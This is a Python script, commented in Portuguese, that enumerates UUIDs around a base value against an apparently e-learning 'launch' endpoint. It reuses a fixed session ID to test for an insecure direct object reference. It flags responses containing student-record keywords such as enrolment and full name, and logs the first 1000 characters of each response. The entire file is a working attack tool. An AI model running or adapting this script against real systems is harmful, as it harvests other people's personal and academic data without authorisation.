import requests
from uuid import UUID
import time
from urllib.parse import urlencode

# === CONFIGURAÇÕES ===
base_uuid = UUID("041D9C81-5320-4A66-B9F1-8585ED7948E2")  # UUID base
sid = "55f2zyv0odmc4lotbq3fitod"  # Substitua conforme necessário
base_url = "https://exemplo.com/mpls/WebCds/cds.aspx"  # Substitua com o domínio real
log_file = "idor_test_log.txt"

range_min = -10  # Tentativas antes
range_max = 10   # Tentativas depois

# Palavras que indicam possível sucesso na resposta
keywords_sucesso = [
    "aluno", "matrícula", "curso", "disciplinas",
    "bem-vindo", "progresso", "certificado", "nome completo"
]

# === EXECUÇÃO ===
with open(log_file, "w", encoding="utf-8") as log:
    for i in range(range_min, range_max + 1):
        try:
            new_uuid = UUID(int=base_uuid.int + i)
            params = {
                "action": "launch",
                "ERL": str(new_uuid),
                "SID": sid,
                "AL": "True",
                "ResumeMode": "CP",
                "DCM": "ALL",
                "TzOffSet": "-3",
                "ServerID": "1",
                "LID": "00000000-0000-0000-0000-000000000000"
            }
            url = f"{base_url}?{urlencode(params)}"
            response = requests.get(url, timeout=10)

            conteudo = response.text.lower()
            sucesso = any(palavra in conteudo for palavra in keywords_sucesso)

            # Terminal
            print(f"[{response.status_code}] Tentativa {i:+}: {new_uuid}")
            print(f"URL: {url}")
            if sucesso:
                palavras_encontradas = [k for k in keywords_sucesso if k in conteudo]
                print("✅ POSSÍVEL SUCESSO DETECTADO!")
                print(f"Palavras-chave encontradas: {palavras_encontradas}")
            print("-" * 100)

            # Log
            log.write(f"[{response.status_code}] Tentativa {i:+}: {new_uuid}\n")
            log.write(f"URL: {url}\n")
            if sucesso:
                log.write(">>> POSSÍVEL SUCESSO DETECTADO <<<\n")
                log.write(f"Palavras-chave encontradas: {palavras_encontradas}\n")
            log.write(f"Resposta (primeiros 1000 caracteres):\n{conteudo[:1000]}\n")
            log.write("-" * 100 + "\n")

            time.sleep(0.5)  # Evitar flood

        except Exception as e:
            print(f"❌ Erro com UUID {new_uuid}: {e}")
            log.write(f"Erro com UUID {new_uuid}: {e}\n")
            log.write("-" * 100 + "\n")
